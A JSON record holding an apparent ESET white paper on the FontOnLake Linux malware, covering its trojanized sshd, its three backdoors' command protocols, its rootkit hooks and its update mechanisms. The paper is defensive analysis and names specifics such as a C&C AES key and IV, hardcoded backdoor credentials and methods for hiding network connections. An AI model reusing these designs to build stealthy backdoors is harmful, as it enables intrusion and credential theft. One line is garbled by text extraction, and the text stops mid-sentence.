{
    "id": "ac2a32bc-1152-4ddb-aecb-bf644ddd7a88",
    "created_at": "2022-10-25T16:48:14.963066Z",
    "updated_at": "2025-03-27T02:16:01.129516Z",
    "deleted_at": null,
    "sha1_hash": "d12845b81e3abd34655647208387d642f8846947",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-10-07T10:50:48Z",
    "file_modification_date": "2021-10-07T10:51:36Z",
    "file_size": 668143,
    "plain_text": "# FontOnLake\n\n#### Author: Vladislav Hrčka\n\n\n-----\n\n## CONTENTS\n\nExecutive summary .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 2\n\nTechnical analysis .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   2\n\nTrojanized applications  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   3\n\nInteraction with the other components .   .   .   .   .   .   .   .   3\n\nIntercepting credentials in sshd .   .   .   .   .   .   .   .   .   .   .  3\n\nBackdoors  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 5\n\nBackdoor 1 .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   5\n\nBackdoor 2  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 10\n\nBackdoor 3  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 14\n\nRootkits .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   16\n\nConclusion .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   22\n\nIoCs .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 23\n\nSamples  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 23\n\nC&Cs  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 24\n\nFilenames .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   24\n\nVirtual filenames  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 24\n\nMITRE ATT&CK techniques .   .   .   .   .   .   .   .   .   .   .   .   .   . 25\n\nAppendix 1 .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   26\n\nAppendix 2 .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   26\n\nAppendix 3 .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   28\n\n\n-----\n\n## EXECUTIVE SUMMARY\n\nFontOnLake is a malware family utilizing well-designed custom modules that are constantly under\n\ndevelopment. It targets systems running Linux and provides remote access to those systems for its\n\noperators, collects credentials, and serves as a proxy server. Its presence is always accompanied by a\n\nrootkit, which conceals its existence.\n\nTheir sneaky nature and advanced design suggest that these tools are used in targeted attacks; the\n\nlocation of the C&C server and the countries from which the samples were uploaded to VirusTotal might\n\nindicate that its operators target at least Southeast Asia.\n\nWe believe that its operators are overly cautious since almost all samples seen use different, unique C&C\n\nservers with varying non-standard ports. The authors use mostly C/C++ and various third-party libraries\n\n[such as Boost, Poco and Protobuf. None of the C&C servers used in samples uploaded to VirusTotal were](https://www.boost.org/)\n\nactive at the time of writing, indicating that they could have been disabled due to the upload. We\n\nconducted several internet-wide scans that imitated initial communication of its network protocols\n\ntargeting the observed non-standard ports in order to identify C&C servers and victims. We managed\n\nto find only one active C&C server, which mostly just maintained connectivity via custom heartbeat\n\ncommands and did not provide any updates on explicit requests.\n\nThe first known FontOnLake file appeared on VirusTotal in May 2020 and other samples were uploaded\n\nthroughout the year.\n\n[Following our discovery while finalizing this white paper, vendors such as Tencent Security Response](https://security.tencent.com/index.php/blog/msg/180)\n\n_[Center, Avast and Lacework Labs published their research on what appears to be the same malware.](https://security.tencent.com/index.php/blog/msg/180)_\n\n## TECHNICAL ANALYSIS\n\nFontOnLake’s currently known components can be divided into the following three groups that interact\n\nwith each other:\n\n- Trojanized applications – otherwise legitimate binaries that are altered to load further components,\n\ncollect data, or conduct other malicious activities.\n\n- Backdoors – user-mode components serving as the main point of communication for its operators.\n\n- Rootkits – kernel-mode components that mostly hide and disguise their presence, assist with updates,\n\nor provide fallback backdoors.\n\n\n-----\n\n## TROJANIZED APPLICATIONS\n\nMultiple trojanized applications were discovered; they are used mostly to load custom backdoor or\n\nrootkit modules. Patches of the applications are most likely applied at the source code level, which\n\nindicates that the applications must have been compiled and replaced the original ones.\n\n[Aside from that, they can also collect sensitive data by modifying sensitive functions such as auth_](https://github.com/openssh/openssh-portable/blob/816036f142ecd284c12bb3685ae316a68d2ef190/auth-passwd.c#L77)\n```\npassword in sshd.\n\n```\nAll the trojanized files are standard Linux utilities and serve as a persistence method because they are\n\ncommonly executed on system start-up.\n\nThe initial way in which these applications get to the victims is not known.\n\n### Interaction with the other components\n\nCommunication of a trojanized application with its rootkit runs through a virtual file, which is created\n\nand managed by the rootkit. Data can be read from or written to the virtual file and exported at the\n\noperator’s request by its backdoor component. We will refer to the virtual file just as “the virtual file”\n\nthroughout this text (known names of the virtual file are in the “IoCs” section).\n\nInteractions between FontOnLake components are visualized in Figure 1.\n\nFigure 1 // Interactions among the components\n\n### Intercepting credentials in sshd\n\n[Intercepting credentials in sshd is achieved through a modification of the auth_password function,](https://github.com/openssh/openssh-portable/blob/816036f142ecd284c12bb3685ae316a68d2ef190/auth-passwd.c#L77)\n\nas seen in Figure 2, so that it will call the function seen in Figure 3. The credentials are written into the\n\nvirtual file in the form:\n```\nsshd||<username>|<password>\n\n```\nThe version of sshd is 5.3p1.\n\n\n-----\n\nFigure 2 // Hex-Rays decompilation of the modified auth_password function in sshd\n\nFigure 3 // Hex-Rays decompilation of the function that collects sshd credentials\n\n\n-----\n\n## BACKDOORS\n\nWe discovered three different backdoors; they are written in C++ and all use, albeit in slightly different\n\n[ways, the same Asio library from Boost for asynchronous network and low-level I/O.](https://www.boost.org/doc/libs/1_69_0/doc/html/boost_asio.html)\n\nThe functionality that they all have in common is that each exfiltrates collected sshd credentials and\n```\nbash command history to its C&C. Considering some of the overlapping functionality, most likely these\n\n```\ndifferent backdoors are not used together on one compromised system.\n\nAll the backdoors additionally use custom heartbeat commands sent and received periodically to keep\n\ntheir C&C connections alive.\n\nFontOnLake malware uses filenames in the form /tmp/.tmp_<random>. Such on-disk files can be\n\nhidden by the rootkits. All samples contained runtime type information (RTTI), and we could have used\n\nseveral original names in the description.\n\n### Backdoor 1\n\nThis is the simplest of the three FontOnLake backdoors; its overall functionality consists currently\n\n(it appears that the malware is under development so features are likely to be added) of launching\n\nand mediating access to a local SSH server, updating itself, and sending to the C&C server the stolen\n\ncredentials (for example by the aforementioned trojanized sshd).\n\nBackdoor 1 is the only one that contains debug symbols; hence we can use all the original names in its\n\ndescription.\n\nThe main class of the backdoor is rmgr_client and its name reappears throughout the code. The\n\nconstructor of the class connects to the C&C and subsequently accepts commands described in the “List\n\n_of commands” section._\n\nWe also have seen another sample of this backdoor with slight differences, which most notably\n\ndownloads an updated version of what is, most likely, a trojanized scp, among other applications known\n\nto be trojanized.\n\nThis “update” of scp suggests that there are trojanized applications that we could not obtain.\n\n#### Getting system info\n\nBackdoor 1 acquires system info by directly executing a Python script whose output is parsed into three\n\ndistinct variables, as seen in Figure 4.\n\nFigure 4 // Hex-Rays decompilation of the command acquirng system info\n\nIf the command fails, FontOnLake assumes Python is not installed and triggers its installation (through\n```\nyum or apt-get).\n\n```\n\n-----\n\n#### List of commands\n\nCurrently supported commands in Backdoor 1 are described in Table 1.\n\nTable 1 // Overview of commands supported by Backdoor 1\n\nCMD Behavior\n\n0x10002 NOP – might be reserved for the injection functionality.\n\n0x10004 Exfiltrates credentials, one by one, by acquiring them from the rootkit and subsequently sending them.\n\nFinishes file-download and checks correctness of the downloaded file by calculating its CRC-32 and comparing\n0x10006\nto the previously received CRC-32.\n\n0x10007 Downloads a part of file; appends body of the message onto already or just opened supplied file.\n\nPasses a message to a sshd session; body of the message is forwarded into the sshd session. The session is\n0x10008\nlooked up by supplied ID in a map of sessions.\n\nCreates a new sshd session; it connects to 127.0.0.1:26657. The session is inserted into the session map with\n0x1000A\nthe supplied session ID. The implementation details are described in the “sshd_client” section.\n\n0x1000B Terminates a sshd session based on supplied session ID and removes it from the sshd session map.\n\n0x1000F Starts update, described in the “Update mechanism” section.\n\nKills a custom sshd if running and terminates itself by instructing the rootkit to terminate it and remove its\n0x10010\non-disk file\n\n0x10011 Extracts and executes the custom sshd, which is described in the “Custom sshd” section\n\n0x10012 Kills the custom sshd if running\n\nTable 2 provides an overview of responses to received commands and initial messages.\n\nTable 2 // Overview of messages that can be sent by Backdoor 1\n\nCMD Behavior\n\n0x10001 Sends initial message for standard execution; it is sent at the beginning of the communication.\n\n0x10003 Sends heartbeat.\n\nSends initial message for requesting updates; it supplies the CRC-32 of the file to be updated and the body of the\n0x10005\nmessage contains the name of the component.\n\n0x10009 Forwards output of a sshd session; supplies the ID of the session.\n\n0x1000C Confirms creation of a new sshd session.\n\n0x1000D Confirms termination of an sshd session.\n\n0x1000E Exfiltrates a credential.\n\n\n-----\n\n#### Custom sshd\n\nAfter it is loaded by Backdoor 1, the custom sshd loads a hardcoded, embedded configuration instead of\n\n[loading one from a file, in comparison to the genuine sshd, which means that the on-disk configurations](https://github.com/openssh/openssh-portable/blob/2dc328023f60212cd29504fc05d849133ae47355/servconf.c#L2441)\n\nare always overridden by its embedded one. The config most notably directs sshd to do the following:\n\n- Change the ListenAddress option to localhost, which means that this sshd is not meant to accept\n\nremote connections. It is supposed to accept local connections mediated through the backdoor.\n\n- Permit root logins.\n\n- Enable X11 forwarding, which allows forwarding the application display of remotely started\n\napplications.\n\n[Also its auth_password function has been changed to always succeed, which is not such a problem on](https://github.com/openssh/openssh-portable/blob/816036f142ecd284c12bb3685ae316a68d2ef190/auth-passwd.c#L77)\n\na local network. Note that the full config is in “Appendix 1”, and this is the only trojanized application\n\ndropped directly by one of the backdoors. The others can be downloaded during the backdoor’s update,\n\nbut the initial process of their installation is not known.\n\nIt uses a hardcoded RSA private key instead of loading one from a key file.\n\nThe use of this custom sshd enables the attackers to hide their own sshd connections while keeping\n\nthe legitimate ones visible – thereby staying under the radar. It also does not have to add its keys to the\n\nkey file, thus avoiding making them visible to the victim.\n\n#### Update mechanism\n\nTo download updates, Backdoor 1 executes its command handling functions (rmgr_client instances)\n\nagain with one difference – it connects to the C&C on a different port and changes the initial message.\n\nThe initial message is not empty; this time it contains the CRC-32 of the file to be updated and the name\n\nof the component (on_connect_message).\n\nWe expect updates to be acquired via commands 0x10007 and 0x10006 for downloading files, as\n\ndescribed in Table 1. Updates are described in the following table. We will refer to all generated\n\ntemporary filenames as temp; they are 32 bytes long and in format /tmp/.tmp_<random>.\n\nTable 3 // Overview of updates\n\nComponent name `on_connect_message` new_path Additional info\n\n\n`rmgr_client` rmgr _temp_\n```\n                system_type_system_ver_\nsshd /usr/sbin/sshd\n                sshd\nssh system_type_system_ver_ssh /usr/sbin/ssh\n\n```\n`inject.so` `inject.so` _temp_\n\n\nAdditionally, issues a command to\nthe rootkit, which terminates and\nremoves the previous version and\nstarts the new one.\n\nAdditionally, instructs the rootkit\nto update the list of files to be\nhidden.\n\n\nrootkit `system_type_kernel_ver.ko`\n\n```\n/lib/modules/kernel_ver/\nkernel/drivers/input/misc/\nati_remote3.ko\n\n```\n\n/etc/sysconfig/modules/ Only if the underlying system is\nPersistence script ati_remote3.modules\n`ati_remote3.modules` CentOS.\n\n\n-----\n\nFigure 5 summarizes the mechanism for downloading updates from the C&C.\n\nFigure 5 // Mechanism for downloading updates\n\n#### Implementation details\n\nIn this section we describe the class structure of Backdoor 1 and mention some of the underlying design\n\npatterns.\n\n#### session\n\n_[session is an abstract class that serves as a base for processing asynchronous I/O using boost::asio::io_](https://www.boost.org/doc/libs/1_69_0/doc/html/boost_asio/reference/io_context.html)_\n\n_[context. Its subclasses are required to implement a primitive operation, which is a part of the template](https://www.boost.org/doc/libs/1_69_0/doc/html/boost_asio/reference/io_context.html)_\n\n_[method for establishing the connection.](https://refactoring.guru/design-patterns/template-method)_\n\n[Sending messages is conducted with boost::asio::async_write. Messages are not sent immediately but](https://www.boost.org/doc/libs/1_69_0/doc/html/boost_asio/reference/async_write.html)\n\nrather are added to a queue. If the queue is empty, it raises an event that starts processing all the\n\npending messages – other messages could have been added before the event completes processing.\n\n#### Timers\n\nIt additionally manages timers, which terminate the event processing loop on timeout. The timers\n\nare set to 30 seconds and represent connect and receive timeouts; they are naturally terminated or\n\nextended on the respective events. Its constructor requires a target port and host to be supplied; it\n\n[subsequently connects to it via boost::asio::async_connect.](https://www.boost.org/doc/libs/1_69_0/doc/html/boost_asio/reference/async_connect.html)\n\n#### Object pool pattern\n\n_session covers the format of exchanged messages as well. Allocation of these messages is managed by a_\n\n[method representing an object pool pattern that reuses already existing but unused objects in respective](https://www.geeksforgeeks.org/object-pool-design-pattern/)\n\nfunction templates. They are implemented with a queue holding unused objects, which are pushed back\n\nwhen a message is sent, and popped on allocation, if it is non-empty.\n\n\n-----\n\nThis use of an object pool suggests that an enormous number of these messages might be exchanged –\n\n[because X11 forwarding is going to be explicitly enabled in sshd and X11 is also known to be inefficient, it](https://superuser.com/questions/1217280/why-is-x11-forwarding-so-inefficient/1217295)\n\nmight be one of the reasons for a possibly significant amount of traffic.\n\nExchanged messages are represented by base class buffer, which holds a structure of the following type\n\n(it can be transported directly using session):\n```\nstruct buffer_impl\n{\n char data[0x100C];\n uint32_t unknown;\n uint64_t size;\n uint64_t data_ptr;\n};\n\n#### rmgr_client\n\n```\nThis class is derived from session.\n\nExchanged messages are represented by the class message, which is an extension to buffer in the following\n\nformat:\n\nstruct message_impl\n```\n{\n buffer_impl buffer;\n uint64_t body_length;\n uint32_t cmd;\n uint32_t opt_parameter;\n};\n\n```\nNote that the body of message cannot carry more than 0x1000 bytes at once and it is always encoded/\n\ndecoded using buffer.\n\nThe primitive operation for the connection template method of session initializes an asynchronous\n\n[reading loop with boost::asio::async_read, which receives and processes commands described in the “List](https://www.boost.org/doc/libs/1_69_0/doc/html/boost_asio/reference/async_read.html)\n\n_of commands” section. It also sends an initial message, which is empty by default._\n\nReceiving commands is done in two steps – in the first one body_length, cmd and opt_parameter are\n\nreceived, while the second one gets the body of the message in size of body_length.\n\n#### sshd_client\n\nThis class is also derived from session.\n\nIt serves as a class for mediating I/O between a sshd process and another party.\n\nThe primitive operation for the connection template method of session initializes an asynchronous\n\n[reading loop with boost::asio::async_read_some. In comparison with the async_read above, it is triggered](https://www.boost.org/doc/libs/1_69_0/doc/html/boost_asio/reference/basic_stream_socket/async_read_some.html)\n\nwhenever any data is read – it does not want to wait until sshd outputs a certain number of bytes.\n\nThe data read is passed to a callback function that must be supplied to the constructor. This selection of\n\n[algorithm at run time fits into the description of a strategy pattern that enables an algorithm’s behavior](https://www.geeksforgeeks.org/strategy-pattern-set-1/)\n\nto be selected at runtime.\n\n_sshd_client is initialized only by rmgr_client, which wraps the read data into message and sends them_\n\nto the C&C.\n\n\n-----\n\n#### Shared library injection\n\nA timer, which currently does not do anything except reset itself, is set up. The timer contains a callback\n\nwhose symbol name is doInject; however, it is empty. There are also other functions that seem\n\nto be intended for future shared library injection. Particularly the functions doLibsToRemove and\n```\ndoLibsToAdd: they allow adding and removing one DT_NEEDED library of a file at a time by using a\n\n```\n[modified patchelf library that accepts the name of the target file and the name of the library to be either](https://github.com/NixOS/patchelf)\n\nadded to/removed from declared dependencies on dynamic libraries (DT_NEEDED).\n\n### Backdoor 2\n\nThe second backdoor serves most notably as a proxy and enables access to a customized sshd similar\n\nto Backdoor 1. It also provides means for standard file manipulation, directory listing, uploading/\n\ndownloading files and updating itself, which are not present Backdoor 1. Exporting credentials is the\n\nsame as in Backdoor 1.\n\n#### Dynamic resolution of C&C\n\nTo dynamically adjust the IP address and port and partially evade blacklisting, the C&C to be connected\n\nto is acquired dynamically via an HTTP request from a first layer server.\n\nThe backdoor randomly chooses a domain from a list, which is present in the “IoCs” section. It resolves\n\nthe domain and sends an HTTP GET request to the acquired IP on a non-standard port for URL path\n```\n/‌iplist. The response is base64 decoded, decrypted by AES-128-CBC with key M4InzQpqqC18d1KL\n\n```\nand IV T4kP7mzlYR8DaLU3. The decrypted response is a host in format <ip>:<port> and connected to\n\nlater.\n\n[The HTTP request is implemented using Poco::Net and crypto using Poco::Crypto.](https://pocoproject.org/docs/Poco.Net.html)\n\n#### Version\n\nThe constructor of its main class, which is called Backdoor throughout the code, contains a string that\n\nappears to be a version number v6.0.3. This probably indicates that the project has been undergoing\n\nactive development.\n\nWe have also found a sample with version number v6.0.2 and minor differences such as using a single\n\ndomain instead of a domain list to query the host.\n\n#### Initialization of communication\n\nThe backdoor changes the default encryption key to a random one using\n```\nPoco::UUIDGenerator::reateRandom().\n\n```\nIt is afterwards sent with system info nodeId:<ethernet_address>|nodeName:<uname.\n```\nnodename>|osVersion:<uname.release>|osArchitecture:<uname.\nmachine>|osDisplayName:<uname.sysname>|osName:<uname.sysname>, where each element is\n\n```\nacquired by Poco::Environment::<element>. Note that in Poco osDisplayName is different from\n```\nosName only on Windows, which indicates that there could be a version for it.\n\n```\nIt additionally sends the OS name acquired either from the file /etc/centos-release or from the\n```\nuname command.\n\n#### Encryption of communication\n\n```\nThe encryption consists of the following steps:\n\n1. [Serializing the message to be sent via protobuf:: Message::SerializeToOstream](https://developers.google.com/protocol-buffers/docs/reference/cpp/google.protobuf.message_lite#MessageLite.SerializeToOstream)\n\n2. [Compressing the serialized message via Poco::DeflatingInputStream with STREAM_ZLIB and Z_DEFAULT_](https://pocoproject.org/docs/Poco.DeflatingInputStream.html)\n```\n COMPRESSION options\n\n```\n\n-----\n\n3. Encrypting the compressed data with AES-256-CBC, whose key and IV is derived via\n```\n Poco::Crypto::CipherKeyImpl::generateKey with the password aes256 initially (but that might\n\n```\nbe changed with a command at the beginning of the communication), empty salt, iteration count 2000\n\n[and digest md5. Poco passes these values to EVP_BytesToKey of OpenSSL](https://www.openssl.org/docs/man1.1.0/man3/EVP_BytesToKey.html)\n\nThe same goes vice versa for decryption.\n\n#### Multilayered command structures\n\nMost of Backdoor 2’s commands are bound to a Protobuf structure using the abstract factory\n\n_[Poco::DynamicFactory. Others, such as heartbeat, are processed directly. The layout of the Protobuf](https://pocoproject.org/docs/Poco.DynamicFactory.html)_\n\nstructure, with comments, is in Appendix 2.\n\nThe benefits of this approach are, for example, that certain messages that do not require encryption and\n\nserialization, such as heartbeats, can be processed immediately.\n\nTable 4 // Layer 1 commands of Backdoor 2\n\nID Description\n\nSets encryption password to the supplied key and calculates endpoint ID of the server as FNV hash from address and received\n0 system information of the server. The endpoint ID is sent back in messages from forwarded connections with their unique ID. The\nendpoint ID suggests that the C&C could be forwarding these messages even further.\n\n2 Heartbeat command.\n\n5 Unwraps forwarded command and sends it to the next layer.\n\nother The command is passed to the next layer.\n\nTable 5 // Layer 2 commands of Backdoor 2\n\nID Description\n\n4 Null function.\n\nUnwraps the command and forwards it to the next layer with supplied unique ID of the command, which is sent back with\n7 the response to tie individual commands to its responses as order of the responses is non-deterministic and there is no other\nidentifier.\n\n9 Null function.\n\n10 Closes all remote sessions and file uploads/downloads tied to the supplied unique ID.\n\n_27_ _Checks whether the current version differs from the just received one, and in such a case asks for update._\n\n_Downloads update – if not already opened, creates a file at its original path and opens it. Writes received data to the file and closes it when it is_\n_29_\n_completely downloaded._\n\nTable 6 // Layer 3 commands of Backdoor 2\n\nCommand Description\n\nEither sends back directory listing or error message directory no exists (sic). It uses\n```\nlistdir\n```\nPoco::DirectoryIterator and Poco::File to acquire the data.\n\n`isdir` Either sends back empty message or directory no exists (sic) on failure.\n\n`version_update` Prepares variables for update and sends back update request.\n\nModifies file attributes according to supplied parameters via Poco::File::set*(). If such file does not exist\nmodify_file_attr\nsends back message file no exists (sic).\n\nmodify_file_time Modifies file time via Poco::File::setLastModified().\n\n\n-----\n\nCommand Description\n\nCreates supplied directory via Poco::File::createDirectories(); it can send back the corresponding\n```\ncreate_dir\n```\nerror message.\n\ncreate_file Creates supplied file Poco::File::createFile(); it can send back the corresponding error message.\n\n`delete_dir` Removes supplied directory via Poco::File::remove(); it can send back the corresponding error message.\n\ndelete_file Removes supplied file via Poco::File::remove(); it can send back the corresponding error message.\n\n\nupload_file_beg\n\n\nInitializes a file upload; each file upload task is assigned an ID starting from 0, and is incremented by one with\neach new upload. The target file is opened for writing and its ID is sent back with file-position, which is 0\nfor a new one. Each file upload is also bound to another supplied unique ID and mismatch results in sending\nback an error message. The file ID is a key into a std::map, which points to the corresponding object with its\nadditional unique ID.\n\n\nupload_file_ing Writes data to the file opened by upload_file_beg and sends back the new position.\n\nThe file is removed from the internal file list maintained by the backdoor, and also implicitly closed due to the\nupload_file_end\nuse of shared pointers and its reference count being 0.\n\ndownload_file_beg\n\nFile download is implemented in the same way as upload. Naturally, it opens a file for read and gets a part\ndownload_file_ing\nwith each download_file_ing command.\n\ndownload_file_end\n\nProxy connection to arbitrary endpoint is established. It is managed in the same way as file upload and\n```\nfwd_beg\n```\ndownload. It also implicitly secures connection to the executed localhost sshd.\n```\nfwd_ing\nfwd_end\n\n```\n`exit` Exits.\n\n`pull_passwd` Acquires a credential from the virtual file and sends it as a response.\n\n#### Custom sshd\n\nUnlike Backdoor 1, Backdoor 2 contains the whole compiled implementation of the customized sshd. It\n\nforks its main() in the beginning.\n\nIt uses this command line: ./sshd -e ssh_host_ecdsa_key -d ssh_host_dsa_key -r ssh_\n```\nhost_rsa_key -p 65439 127.0.0.1.\n\n```\nThe username and password for connecting to the server is modified to user and 123456; it listens on\n\nport 65439 at localhost and uses the supplied keys.\n\nIt does not accept remote connections, but the attacker can still access the shell, since the backdoor\n\nrelays outside connections to it. It uses hardcoded private keys instead of loading them from files.\n\nThe advantage of this approach, in comparison to the Backdoor 1, is that no additional files are dropped\n\nto the disk.\n\n#### Update mechanism\n\nBackdoor 2 removes its on-disk file at the beginning of execution. Then it launches an infinite loop,\n\nwhere it forks – the child process breaks out of the loop and the parent waits for the child to finish.\n\nWhen the child finishes, it checks whether there is an on-disk file in its original path even though it was\n\njust deleted – it could have downloaded an update via command 29 in Table 5 in the meantime. The\n\nupdated file is executed in such cases.\n\n\n-----\n\nFigure 6 // Hex-Rays decompilation of the update start-up\n\nFigure 7 // Mechanism for downloading updates where cmd.* structures are described in Appendix 2\n\n#### Implementation details\n\nAnother similarity with Backdoor 1 is its base class for asynchronous communication, which is called Socket\n\n[this time. The class is bound to boost::asio::io_context just like session in Backdoor 1 and uses a structure](https://www.boost.org/doc/libs/1_69_0/doc/html/boost_asio/reference/io_context.html)\n\nwith a command and size of its body. The messages are received in the same two steps as well.\n\nThere is also a class like sshd_client called Session; unlike Socket, it does not encrypt communication. It is\n\nused for connecting to arbitrary endpoints and mediating the traffic just like sshd_client.\n\n\n-----\n\n#### Congestion handling\n\nBackdoor 2 has a means for handling message congestion – when the queue of messages to be sent reaches:\n\n- 100 or more, it forces one to be sent instead of receiving the next message\n\n- 1000 or more, it suppresses receiving messages and only processes the queue; it sends heartbeats\n\nuntil the queue falls below 1000\n\n### Backdoor 3\n\nThe third backdoor can most notably run in both client and server mode – it accepts remote\n\nconnections. It serves as a proxy and is capable of exporting collected credentials like the previous\n\ntwo. Furthermore, it can download and execute Python scripts and shell commands. The backdoor\n\nsubsequently mediates I/O of the scripts and commands in both directions.\n\n#### Initialization of communication\n\n[After a successful connection, a message containing Python’s FNV hash of <uname.sysname>|< uname.](http://www.isthe.com/chongo/tech/comp/fnv/)\n```\nrelease>|<uname.machine>|<ethernet_address> is sent.\n\n```\nIt also acquires all the credentials from the virtual file and sends them back one by one.\n\n#### Command structures\n\nCurrently supported commands are described Table 7.\n\nTable 7 // Layer 1 commands of Backdoor 3\n\nID Description\n\n0x100 Serves as a heartbeat and acquires all the credentials from the virtual file and sends them back one by one.\n\n0x101 Forwards the commands to the next layer.\n\n0x107 Exits.\n\n0x108 Closes all remote sessions and shells tied to a supplied unique ID.\n\n0x407 Forwards received data to a session tied to a supplied unique ID.\n\n0x408 Terminates Python script to be executed by the next command.\n\n\n0x409\n\n\nUses a short Python script, which is presented in “Appendix 3”, to download and execute additional task – Python script\naccording to the extension from an FTP server protected with hardcoded credentials. The name of the file to be downloaded\nis in the format tasks/<task_name>.py, where <task_name> is received. Only one such script can run at a time.\n\nTable 8 // Layer 2 commands of Backdoor 3\n\n\nID Description\n\nExecutes supplied shell command and mediates subsequent I/O, each executed command is identified with a supplied\n0x300\nunique ID. If there is already one shell for the supplied unique ID, message hostid already connected. is sent back.\n\n0x301 Removes and terminates a shell session for a supplied unique ID.\n\nForwards a message to certain shell session based on supplied unique ID. If it failed to find such shell session, message no\n0x302\nfind shell hostid! (sic) is sent back.\n\n\n0x400\n\n\nEstablishes proxy connection to a supplied endpoint. Each connection is represented by two unique IDs – we suspect that\none represents endpoint ID and the other a connection ID. The operators can effectively route traffic of multiple machines\nthrough the victim.\n\n\n0x401 Terminates a proxy session for supplied unique ID.\n\nForwards a message to a certain proxy session based on supplied unique IDs. If it fails to find such a connection, it sends\n0x402\nback an error message.\n\nSends back a message with name of the active Python script as task:<task_name> or the message no task! (sic). The\n0x40B\nlatter is sent when there is no active task – no running Python script.\n\n\n-----\n\n#### Implementation details\n\nForks – both processes create an instance of class which is referred to as Backdoor throughout\n\nthe code.\n\nThe two instances of Backdoor vary only in a flag, which instructs it to either connect to a particular\n\nC&C or to run in server mode – it listens on 0.0.0.0, which stands for every available network interface.\n\nThere is no difference in the functionality when the connection is established.\n\nIt uses class SocketWrap, comparable to class Socket and session from the previous backdoors, to manage\n\nasynchronous I/O.\n\n_SocketWrap is also similar to class Session from Backdoor 2, since it runs in two modes depending_\n\non whether the connection is direct with the operator or just meant to mediate certain I/O. One\n\n[uses boost::asio::async_read and handles commands; the other just forwards received data using](https://www.boost.org/doc/libs/1_69_0/doc/html/boost_asio/reference/async_read.html)\n\n_[boost::asio::async_read_some.](https://www.boost.org/doc/libs/1_69_0/doc/html/boost_asio/reference/basic_stream_socket/async_read_some.html)_\n\nIts commands are not represented by Protobuf as in Backdoor 2; they are always stored as a vector of\n\nunsigned chars and later manually parsed based on the ID of the received command.\n\nThe structure of the exchanged commands follows the same pattern as those in the previous backdoors\n\n– they contain the ID of the command to be executed, size of its body, and a unique ID when mediating\n\ndata from/to a remote endpoint.\n\n\n-----\n\n## ROOTKITS\n\nAll samples we have seen target kernel versions 2.6.32-696.el6.x86_64 and 3.10.0-229.el7.x86_64\n\n[according to vermagic. There are two known versions of the rootkit with significant differences, but](http://embeddedguruji.blogspot.com/2019/05/vermagic-in-linux-device-driver.html)\n\n[certain overlap. They are based on an open-source project Suterusu, and share the following overall](https://github.com/mncoppola/suterusu)\n\nfunctionality:\n\n- Process hiding\n\n- File hiding\n\n- Hiding itself (own kernel module)\n\n- Hiding network connections\n\n- Exposing the collected credentials to its backdoor\n\n#### Version 1\n\nThe most notable feature present only in the first version of the rootkit is monitoring traffic for specially\n\ncrafted ICMP packets and subsequently downloading and executing additional binaries (backdo ors)\n\nfrom specified endpoints. The feature was present only in the earliest samples and dropped later.\n\nSome samples of the first version also extract and execute the user-mode backdoor.\n\nIt also hides itself by removing its kernel module from the module and kobject lists.\n\n#### The virtual file\n\nThe virtual file is created with the following file operations:\n\nTable 9 // File operations of the virtual file\n\nOperation Description\n\nEither appends PID of the calling process onto a list of PIDs to be hidden or attaches the received buffer and\nwrite\nits size onto a list of collected credentials. The former only occurs when the received buffer is 0xFF11\n\nCalls standard method single_open(), which is more suitable for small and non-iterative outputs than\nopen\n```\n            seq_open(); it also means that only one of seq_operations must be implemented – show()\n\n```\nReplaces with single_release() due to the use of single_open() in the open file operation to avoid\nrelease\nmemory leaks\n\nllseek Reuses seq_file-supplied method seq_lseek()\n\nread Reuses seq_file-supplied method seq_read()\n\nThe above-mentioned show() implementation of the seq_operations supplies the collected credentials\n\nto the backdoors – it uses seq_write() to output the last entry from the list of collected credentials.\n\nThe last entry is subsequently discarded.\n\nFigure 8 // The structure of the list with collected credentials\n\n#### Hiding processes and files\n\nTo hide processes and files, the rootkit hooks system call getdents(). System call getdents() is used\n\nmost notably by the standard function readdir() to list files inside a directory.\n\nThe hook ignores files under /proc whose names are either equal to the name of its virtual file or\n\npresent in the list of PIDs to be hidden.\n\n\n-----\n\n#### Hiding network connections\n\nIt implements two hooks to hide its network connections. The first one is a hook of the write() system\n\ncall – it checks whether the name of the calling process is ss (a tool for socket investigation) and trims\n\nlines containing its C&Cs or non-standard ports. Note that this functionality was not present in one of\n\nthe samples.\n\nThe second one is a hook of the tcp4_seq_show seq_ operation from /proc/net/tcp. The hook calls\n\nthe original tcp4_seq_show and subsequently discards entries containing its non-standard ports.\n\n#### Port forwarding\n\nThe rootkit registers the NF_INET_PRE_ROUTING hook using the nf_register_hook() method. The\n\nhook checks whether the protocol in the IP header of the received packet is IPPROTO_TCP or IPPROTO_\n\nICMP. The former is used for port forwarding and latter for magic packets (to be described below).\n\nFigure 9 // Disassembly of the NF_INET_PRE_ROUTING hook\n\nThe port forwarding is achieved by changing the destination (local) port for certain source (remote) IP\n\nand port pair changes.\n\nThis suggests that if matching port forwarding could be implemented also on its server, such behavior\n\ncould be used to bypass some stateful firewalls and further obscure its communication and presence.\n\nHowever, we did not observe this behavior in the one C&C we discovered.\n\nOne of the samples did not have this functionality properly implemented – it additionally changed the\n\ndestination (local) IP to gibberish that probably should have been the localhost; however, the authors\n\nmight have made a mistake or did not remove testing code. They probably wanted to try to make the\n\ntraffic look as if it were local.\n\nN t th t f l hi b hi d PAT ld t b bl t i t thi\n\n\n-----\n\n#### Magic packets\n\nOne further check is conducted in the IPPROTO_ICMP hook. If the ICMP code is ICMP_ECHO, the size of\n\nthe IP packet is 0x28, and the 